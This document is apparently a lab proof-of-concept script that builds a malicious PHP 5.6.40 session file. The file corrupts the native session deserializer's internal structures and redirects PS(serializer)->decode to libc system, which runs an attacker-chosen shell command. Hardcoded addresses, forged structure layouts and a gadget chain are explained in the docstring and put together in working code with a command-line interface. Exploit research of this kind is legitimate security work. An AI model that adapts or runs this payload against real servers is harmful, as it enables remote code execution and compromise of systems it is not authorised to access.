#!/usr/bin/env python3
"""
Build the PHP 5.6.40 native session-file payload for the decode-slot pivot.

Lab geometry (ASLR off, private FPM pool; observed live):
    first s_read buffer  X1 = 0x7ffff7cbb580   (upload-progress START decode)
    second s_read buffer X2 = 0x7ffff7cbc338   (upload-progress END decode)
    stale php_unserialize_data P = X1 + 0x190 = 0x7ffff7cbb710
    fake serializer struct F1     = X2 + 0x300 = 0x7ffff7cbc638
    libc system                   = 0x7ffff7d1c090
    survival encode gadget        = 0x4b4728 (5.6.40, inside ps_close_user:
                                    movl $0,0x82e5b8; jmp 0x4b46d5;
                                    load php_session_encode's ret local;
                                    leave; ret)

The file is 0x400 bytes and is re-read by the second decode into X2, so F1's
fields are populated before PS(serializer)->decode is called.

File layout
-----------
   0x00  record 1: key length 0x20 (space), 32-byte command key (space-padded
         on the left), then "R:1057;"
   0x28  record 2: key length 0x01, key "z", then s:973:"<973 bytes>";"
   0x31  start of the 973-byte string payload (fills to 0x3fd, closing ";")
   0x190 fake php_unserialize_data P:
            +0x00 first      = X1 + 0x200 - 0x2000
            +0x08 last       = X1 + 0x220 - 0x2000
            +0x10 first_dtor = 0
            +0x18 last_dtor  = X1 + 0x280 - 0x2000
   0x200 first->used_slots = 0x1000  (>= 1056, so R:1057 reads data[1056])
   0x220 last->used_slots  = 1068    (so the string top push lands at X1+0x380)
   0x280 last_dtor->used_slots = K0   (dtor pre-push at 0x82e5b8, top push at
                                       PS(serializer)=0x82e5c0)
   0x300 F1+0x00 = F1 (name field, harmless)
   0x308 F1+0x08 = encode gadget 0x4b4728
   0x310 F1+0x10 = libc system

Why the second buffer: the first decode's R: does Z_ADDREF_PP/Z_SET_ISREF_PP on
F1, writing zval refcount/is_ref metadata at F1+0x10 and F1+0x15.  F1 lives in
X2, which has not been read yet, so those writes hit zeroed memory; the second
s_read overwrites X2 with the file and restores F1+0x10 = system.

The R: pre-push (var_push_dtor_no_addref) writes the old current zval pointer
to PS(serializer)-8 = 0x82e5b8, which aliases PS(mod_user_implemented) /
PS(mod_user_is_open).  The encode gadget zeroes that qword before the final
close, preventing ps_close_files(NULL) at RSHUTDOWN.

Usage:
    ./make_native56.py --marker /tmp/p5r --out sess_psys5.payload
"""
import argparse
import struct

X1_DEFAULT = 0x7FFFF7CBB580
X2_DEFAULT = 0x7FFFF7CBC338
SYSTEM_DEFAULT = 0x7FFFF7D1C090
ENCODE_DEFAULT = 0x4B4728

PS_SERIALIZER = 0x82E5C0
U1 = 0x200
U2 = 0x280
U3 = 0x220
LSTR = 973
FILESIZE = 0x400


def build(marker, x1, x2, system_addr, encode_addr):
    core = ("touch %s #" % marker).encode()
    if len(core) > 32:
        raise SystemExit("marker command too long: %d bytes (max 32)" % len(core))
    key = b" " * (32 - len(core)) + core

    rec1 = bytes([32]) + key + b"R:1057;"
    if len(rec1) != 0x28:
        raise SystemExit("record 1 must be 0x28 bytes, got %#x" % len(rec1))

    hdr = ("s:%d:\"" % LSTR).encode()
    off = len(rec1)
    payload_start = off + 2 + len(hdr)
    if payload_start + LSTR + 2 != FILESIZE:
        raise SystemExit("record 2 does not fill the file")

    buf = bytearray(b"A" * FILESIZE)
    buf[0:len(rec1)] = rec1
    buf[off] = 1
    buf[off + 1] = ord("z")
    buf[off + 2:off + 2 + len(hdr)] = hdr
    buf[payload_start + LSTR:payload_start + LSTR + 2] = b"\";"

    first = x1 + U1 - 0x2000
    last = x1 + U3 - 0x2000
    last_dtor = x1 + U2 - 0x2000
    k0 = (PS_SERIALIZER - last_dtor) // 8 - 1
    k3 = (0x380 + 0x2000 - U3) // 8
    f1 = x2 + 0x300

    def putq(o, v):
        buf[o:o + 8] = struct.pack("<Q", v & ((1 << 64) - 1))

    putq(0x190, first)
    putq(0x198, last)
    putq(0x1A0, 0)
    putq(0x1A8, last_dtor)
    putq(0x200, 0x1000)
    putq(0x220, k3)
    putq(0x280, k0)
    putq(0x300, f1)
    putq(0x308, encode_addr)
    putq(0x310, system_addr)

    assert len(buf) == FILESIZE
    return bytes(buf), {
        "x1": x1,
        "x2": x2,
        "p": x1 + 0x190,
        "f1": f1,
        "first": first,
        "last": last,
        "last_dtor": last_dtor,
        "k0": k0,
        "k3": k3,
        "system": system_addr,
        "encode": encode_addr,
        "marker": marker,
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--marker", default="/tmp/p5r")
    ap.add_argument("--out", default="sess_psys5.payload")
    ap.add_argument("--x1", type=lambda s: int(s, 0), default=X1_DEFAULT)
    ap.add_argument("--x2", type=lambda s: int(s, 0), default=X2_DEFAULT)
    ap.add_argument("--system", type=lambda s: int(s, 0), default=SYSTEM_DEFAULT)
    ap.add_argument("--encode", type=lambda s: int(s, 0), default=ENCODE_DEFAULT)
    args = ap.parse_args()

    payload, info = build(args.marker, args.x1, args.x2, args.system, args.encode)
    with open(args.out, "wb") as f:
        f.write(payload)
    print("wrote %s (%d bytes)" % (args.out, len(payload)))
    for k in ("x1", "x2", "p", "f1", "first", "last", "last_dtor", "k0", "k3",
              "system", "encode"):
        print("  %-10s 0x%x" % (k, info[k] & ((1 << 64) - 1)))
    print("  marker     %s" % info["marker"])


if __name__ == "__main__":
    main()
